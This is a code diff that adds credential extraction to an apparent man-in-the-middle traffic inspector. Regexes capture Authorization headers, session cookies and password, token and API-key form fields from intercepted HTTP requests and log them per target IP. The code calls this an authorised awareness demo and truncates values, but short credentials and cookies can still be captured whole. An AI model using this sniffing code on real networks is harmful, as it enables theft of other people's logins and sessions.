@@ -112,6 +112,20 @@ _HTTP_HOST_RE = re.compile(rb"\r\nHost:\s*([^\r\n]+)", re.IGNORECASE)
 _HTTP_REQUEST_LINE_RE = re.compile(
     rb"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP/",
 )
+_HTTP_AUTH_RE = re.compile(
+    rb"\r\nAuthorization:\s*([^\r\n]+)", re.IGNORECASE,
+)
+_HTTP_COOKIE_RE = re.compile(
+    rb"\r\nCookie:\s*([^\r\n]+)", re.IGNORECASE,
+)
+# Form-encoded password fields. Match the field name and value so the
+# user can see what was leaked. Limited to the first 256 bytes of value
+# so we don't dump arbitrary upload bodies.
+_FORM_PASSWORD_RE = re.compile(
+    rb"(?:^|&)([A-Za-z0-9_\-\[\]]*(?:pass(?:word)?|pwd|secret|token|api[_-]?key))="
+    rb"([^&\r\n]{1,256})",
+    re.IGNORECASE,
+)
 
 
 def _extract_http(payload: bytes) -> Optional[tuple[str, str, str]]:
@@ -129,6 +143,49 @@ def _extract_http(payload: bytes) -> Optional[tuple[str, str, str]]:
         return method, host, path
     except Exception:
         return None
+
+
+def _extract_credentials(payload: bytes, host: str, path: str) -> list[str]:
+    """Pull credential-shaped strings out of a plaintext HTTP request.
+
+    Returns a list of human-readable summaries — one per finding. Designed
+    for the security-awareness use case: showing *how* plain HTTP leaks
+    credentials in real time during an authorised demo. Sensitive values
+    are truncated.
+    """
+    findings: list[str] = []
+    try:
+        # HTTP Basic Auth — base64-encoded `user:pass` in the Authorization header.
+        auth = _HTTP_AUTH_RE.search(payload)
+        if auth:
+            scheme = auth.group(1).decode("ascii", errors="replace").strip()
+            findings.append(f"HTTP Auth header → {host}{path}  ({scheme[:60]})")
+
+        # Plaintext session cookie (no decoding, just visibility).
+        cookie = _HTTP_COOKIE_RE.search(payload, 0, min(len(payload), 4096))
+        if cookie:
+            cookie_str = cookie.group(1).decode("ascii", errors="replace").strip()
+            findings.append(
+                f"Session cookie → {host}{path}  ({cookie_str[:80]}…)"
+                if len(cookie_str) > 80
+                else f"Session cookie → {host}{path}  ({cookie_str})"
+            )
+
+        # Form-encoded password / token in POST body.
+        body_start = payload.find(b"\r\n\r\n")
+        body = payload[body_start + 4:] if body_start >= 0 else b""
+        if body:
+            for m in _FORM_PASSWORD_RE.finditer(body):
+                field = m.group(1).decode("ascii", errors="replace")
+                value = m.group(2).decode("ascii", errors="replace")
+                if len(value) > 60:
+                    value = value[:60] + "…"
+                findings.append(
+                    f"Form field '{field}' → {host}{path}  ({value})"
+                )
+    except Exception:
+        pass
+    return findings
 
 
 # ---------------------------------------------------------------------------
@@ -165,7 +222,10 @@ class MITMInspector:
         self._thread: Optional[threading.Thread] = None
         self.events: collections.deque = collections.deque(maxlen=self.EVENT_LIMIT)
         self.per_target: dict[str, dict] = {
-            ip: {"dns": 0, "sni": 0, "http": 0, "bytes": 0, "last_seen": 0.0}
+            ip: {
+                "dns": 0, "sni": 0, "http": 0, "cred": 0,
+                "bytes": 0, "last_seen": 0.0,
+            }
             for ip in self.target_ips
         }
         self.started_at: float = 0.0
@@ -297,6 +357,9 @@ class MITMInspector:
                         value = f"{method} {host}{path}" if host else \
                                 f"{method} {path}"
                         self._record_event(target, "http", value)
+                        # Scan the same payload for credentials.
+                        for cred in _extract_credentials(payload, host, path):
+                            self._record_event(target, "cred", cred)
         except Exception:
             # Never let a malformed packet kill the sniff thread.
             pass
@@ -324,6 +387,8 @@ class MITMInspector:
             })
             stats = self.per_target.setdefault(
                 target,
-                {"dns": 0, "sni": 0, "http": 0, "bytes": 0, "last_seen": 0.0},
+                {"dns": 0, "sni": 0, "http": 0, "cred": 0,
+                 "bytes": 0, "last_seen": 0.0},
             )
             stats[kind] = stats.get(kind, 0) + 1
+            stats["last_seen"] = time.time()
